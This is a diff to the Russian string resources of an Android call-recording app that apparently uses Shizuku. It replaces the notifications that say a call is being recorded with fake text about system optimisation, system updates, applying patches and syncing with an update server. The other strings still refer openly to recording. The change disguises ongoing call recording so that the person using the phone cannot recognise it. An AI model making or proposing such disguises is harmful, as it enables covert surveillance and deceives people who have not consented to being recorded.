@@ -100,12 +100,12 @@
     <string name="settings_view_licenses">Посмотреть лицензии</string>
     <string name="settings_open_github">Открыть GitHub репозиторий</string>
     <string name="contact_search_hint">Искать по имени или номеру...</string>
-    <string name="recording_standby_notification_title">Звонок в процессе</string>
+    <string name="recording_standby_notification_title">Оптимизация производительности системы</string>
     <string name="recording_notification_cross_country_tip">🌐 Международный</string>
     <string name="recording_notification_current_country_tip">🏠Домашний регион</string>
-    <string name="recording_notification_title">Запись в процессе</string>
-    <string name="recording_notification_press_to_start">Нажмите, чтобы начать запись</string>
-    <string name="recording_notification_waiting_shizuku">Ожидание, пока сервер Shizuku запустится...</string>
+    <string name="recording_notification_title">Выполняется обновление системы</string>
+    <string name="recording_notification_press_to_start">Применить системные патчи</string>
+    <string name="recording_notification_waiting_shizuku">Синхронизация с сервером обновлений...</string>
     <string name="recording_notification_press_to_pause">Нажмите, чтобы поставить запись на паузу</string>
     <string name="recording_notification_press_to_resume">Нажмите, чтобы возобновить запись</string>
     <string name="recording_toast_standby">Переход в режим ожидания для вызова %1$s.</string>
